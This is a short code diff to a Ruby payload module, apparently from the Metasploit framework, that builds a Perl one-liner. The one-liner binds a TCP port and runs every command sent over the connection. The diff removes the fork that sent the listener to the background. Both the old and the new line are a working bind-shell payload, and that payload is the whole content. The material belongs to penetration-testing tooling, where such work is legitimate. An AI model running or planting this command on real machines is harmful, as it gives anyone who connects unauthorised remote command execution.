@@ -56,7 +56,7 @@ module BindPerlW
 	#
 	def command_string
 
-		cmd = "perl -MIO -e \"$p=fork();exit,if$p;while($c=new IO::Socket::INET(LocalPort,#{datastore['LPORT']},Reuse,1,Listen)->accept){$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>}\""
+		cmd = "perl -MIO -e \"while($c=new IO::Socket::INET(LocalPort,#{datastore['LPORT']},Reuse,1,Listen)->accept){$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>}\""
 
 		return cmd
 	end
